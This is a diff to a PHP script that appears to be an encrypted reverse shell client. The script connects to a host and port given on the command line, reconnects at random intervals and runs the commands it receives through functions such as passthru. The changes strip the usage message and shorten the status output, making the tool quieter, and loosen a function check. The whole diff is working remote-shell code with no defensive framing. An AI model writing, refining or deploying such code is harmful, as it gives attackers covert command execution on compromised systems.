@@ -7,7 +7,7 @@
 	$opts = getopt("h:p:", ["host:", "port:"]);
 	$opensslpath = './Openssl_EncryptDecrypt.php';
 
-	(count($opts) === 2) || die("assign remote ip [-h/--host] and port [-p/--port]\n");
+	(count($opts) === 2) || die();
 	$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
@@ -19,19 +19,19 @@
 		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
 	} else { die(); }
 
-	echo "\33[32mconnected to host.\33[0m\n";
+	echo "\33[32mconnected.\33[0m\n";
 	while(1)
 	{
 		// surpress "transport endpoint not connected" warning
 	    if(($recv = @socket_read($socket, BUFFER_LEN)) === false || $recv === "")
 	    {
 			socket_close($socket);
-	    	echo "[\33[91m!\33[0m] empty stream.. disconnected.\n";
+	    	echo "[\33[91m!\33[0m] disconnected.\n";
 			sleep(rand(1,5)); // try to reconnect => 1-5 sec interval
 
     		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 			$result = @socket_connect($socket, $addr, $port);
-			echo ($socket && $result) ? "\33[32mconnected to host.\33[0m\n" : '';
+			echo ($socket && $result) ? "\33[32mconnected.\33[0m\n" : '';
 		}
 	    else
 	    {
@@ -65,10 +65,7 @@
 						foreach($results as $res){ $result .= $res."\n\r"; }
 					}
 				}
-				else if(function_exists('passthru')
-					&& function_exists('ob_start')
-					&& function_exists('ob_end_clean'))
-				{
+				else if(function_exists('passthru')){
 					$fnc = "passthru()";
 					@ob_start(); 		
 					@passthru($full_cmd); 		
